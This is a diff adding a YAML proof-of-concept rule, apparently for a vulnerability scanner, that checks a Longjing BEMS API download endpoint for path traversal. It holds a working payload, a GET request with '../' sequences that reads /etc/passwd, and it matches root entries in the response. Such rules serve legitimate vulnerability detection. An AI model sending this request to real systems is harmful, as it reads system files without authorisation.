@@ -1,0 +1,13 @@
+name: poc-yaml-longjing-bems-api-file-read
+rules:
+  - method: GET
+    path: /api/downloads?fileName=../../../../../../../../etc/passwd
+    follow_redirects: false
+    expression: |
+      response.status == 200 && "root:.*:0:0".bmatches(response.body)
+
+detail:
+  author: For3stCo1d
+  description: "longjingbemsapi文件读取"
+  links:
+    - https://www.zeroscience.mk/codes/longjingbems_fd.txt
